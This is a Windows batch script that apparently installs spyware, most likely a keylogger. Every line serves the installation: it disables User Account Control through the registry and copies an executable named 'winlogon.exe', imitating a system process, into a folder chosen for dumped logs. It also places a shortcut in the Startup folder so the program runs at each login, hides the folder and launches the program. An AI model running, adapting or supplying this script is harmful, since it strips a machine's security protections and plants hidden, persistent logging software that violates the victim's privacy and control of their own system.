@echo off
reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA /f /t REG_DWORD /d 0
set "psCommand="(new-object -COM 'Shell.Application')^
.BrowseForFolder(0,'Choose a folder to actively dump the log(s) into. You may also create a new folder. Make sure you have read/write privileges in the folder you choose (eg: not a system location such as majority of the OS partition).',0,0).self.path""
for /f "usebackq delims=" %%I in (`powershell %psCommand%`) do set "CUSTOMPATH=%%I"
xcopy "%CD%\winlogon.exe" "%CUSTOMPATH%\" /O /X /H /K /I
sct.exe /f:"init.dll_.lnk" /a:C /t:"%CUSTOMPATH%\winlogon.exe" /w:"%CUSTOMPATH%"
xcopy "%CD%\init.dll_.lnk" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
attrib +h %CUSTOMPATH%
cd /d "%CUSTOMPATH%\"
start winlogon.exe